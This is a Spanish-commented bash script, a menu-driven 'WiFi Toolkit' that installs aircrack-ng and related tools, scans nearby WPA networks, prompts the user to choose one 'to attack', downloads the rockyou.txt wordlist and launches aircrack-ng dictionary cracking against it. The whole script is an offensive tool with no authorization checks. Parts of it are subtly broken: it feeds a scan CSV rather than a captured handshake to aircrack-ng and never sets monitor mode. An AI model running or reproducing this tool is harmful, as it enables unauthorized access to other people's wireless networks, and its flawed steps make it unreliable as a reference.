#!/bin/bash

# Colores para salida visual
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sin color

# Configuración del proyecto
PROJECT_NAME="wifi_toolkit"
DOWNLOADS_DIR="$HOME/Downloads"
PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog" "hcxpcapngtool")

# Crear directorios necesarios
prepare_project_directory() {
    mkdir -p "$PROJECT_DIR" "$RESULTS_DIR" 2>/dev/null
}

# Mostrar progreso
show_progress() {
    local total=$1
    local current=0
    local step=$((100 / total))

    while [ $current -le 100 ]; do
        dialog --gauge "Procesando..." 10 50 $current
        sleep 1
        ((current += step))
    done
}

# Verificar e instalar dependencias
install_dependencies() {
    dialog --title "Verificando dependencias" --infobox "Revisando requerimientos..." 8 40
    sleep 2

    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            dialog --title "Instalando $dep" --infobox "Instalando $dep..." 8 40
            sudo apt-get install -y "$dep" &>/dev/null || {
                dialog --title "Error" --msgbox "No se pudo instalar $dep. Intenta manualmente." 8 40
                exit 1
            }
        fi
    done
    dialog --title "Dependencias" --msgbox "Todas las dependencias están instaladas correctamente." 8 40
}

# Escaneo de redes
scan_networks() {
    local interface=$(detect_wireless_interface)
    dialog --title "Escaneo de Redes" --infobox "Iniciando escaneo en $interface..." 8 40
    sleep 2

    xterm -hold -e "airodump-ng $interface --output-format csv --write $RESULTS_DIR/network_scan" &
    sleep 10
    killall airodump-ng
    dialog --title "Escaneo Completado" --msgbox "El escaneo se ha completado. Procediendo al análisis..." 8 40

    parse_network_results "$RESULTS_DIR/network_scan-01.csv"
}

# Procesar resultados del escaneo
parse_network_results() {
    local scan_file=$1
    local networks=()

    if [[ -f "$scan_file" ]]; then
        while IFS=, read -r bssid essid _; do
            if [[ "$bssid" =~ ^([0-9A-F]{2}:){5}[0-9A-F]{2}$ ]]; then
                networks+=("$bssid" "$essid")
            fi
        done < <(grep WPA "$scan_file")

        if [[ ${#networks[@]} -eq 0 ]]; then
            dialog --title "Redes" --msgbox "No se encontraron redes vulnerables." 8 40
            return
        fi

        local choice=$(dialog --menu "Selecciona una red para atacar:" 20 60 10 "${networks[@]}" 3>&1 1>&2 2>&3)

        if [[ -n "$choice" ]]; then
            start_attack "$choice" "$scan_file"
        else
            dialog --title "Error" --msgbox "No se seleccionó ninguna red." 8 40
        fi
    else
        dialog --title "Error" --msgbox "No se encontró el archivo de escaneo." 8 40
    fi
}

# Iniciar ataque
start_attack() {
    local bssid=$1
    local scan_file=$2

    dialog --title "Ataque" --infobox "Preparando ataque contra $bssid..." 8 40
    sleep 2

    local dictionary=$(find_or_download_dictionary)

    dialog --title "Ataque" --infobox "Iniciando ataque con aircrack-ng..." 8 40
    xterm -hold -e "aircrack-ng -w $dictionary -b $bssid $scan_file" &
    sleep 5
}

# Buscar o descargar diccionario
find_or_download_dictionary() {
    local dictionary_path=$(find / -type f -name "rockyou.txt" 2>/dev/null | head -n 1)
    if [[ -z "$dictionary_path" ]]; then
        dialog --title "Diccionario" --infobox "Descargando diccionario rockyou.txt..." 8 40
        curl -o "$PROJECT_DIR/rockyou.txt.gz" https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz
        gzip -d "$PROJECT_DIR/rockyou.txt.gz"
        dictionary_path="$PROJECT_DIR/rockyou.txt"
    fi
    echo "$dictionary_path"
}

# Detectar interfaz inalámbrica
detect_wireless_interface() {
    iw dev | grep Interface | awk '{print $2}' | head -n 1
}

# Menú principal
main_menu() {
    while true; do
        option=$(dialog --title "WiFi Toolkit" --menu "Selecciona una opción:" 20 60 10 \
            1 "Instalar dependencias" \
            2 "Escanear redes" \
            3 "Salir" 3>&1 1>&2 2>&3)

        case $option in
            1) install_dependencies ;;
            2) scan_networks ;;
            3) clear; exit 0 ;;
            *) dialog --title "Error" --msgbox "Opción inválida." 8 40 ;;
        esac
    done
}

# Inicio del script
prepare_project_directory
main_menu
